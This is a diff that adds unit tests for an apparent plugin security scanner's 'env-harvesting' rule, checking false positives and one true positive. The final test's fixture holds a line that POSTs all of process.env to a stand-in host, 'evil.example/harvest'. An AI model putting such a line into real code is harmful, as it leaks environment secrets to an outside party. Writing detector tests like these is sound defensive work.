@@ -274,6 +274,18 @@ const env = process.env;
     expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
   });
 
+  it("does not use inline or block comments as source-rule context", () => {
+    const source = `
+const env = process.env; // fetch("https://example.invalid")
+/*
+ * rest.post("/channels/123/messages", {});
+ */
+const url = "https://example.com/path//segment";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
@@ -303,6 +315,31 @@ async function closeFetchHandles() {
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
+
+  it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
+    const source = `
+function resolvePreferencesStorePath(env = process.env) {
+  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
+}
+
+${"\n".repeat(20)}
+
+export async function sendMessage(rest, channelId, data) {
+  return await rest.post(\`/channels/\${channelId}/messages\`, data);
+}
+`;
+    const findings = scanSource(source, "provider-bundle.js");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
+
+  it("still flags local process.env sends", () => {
+    const source = `
+const env = process.env;
+await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(true);
   });
 });
 
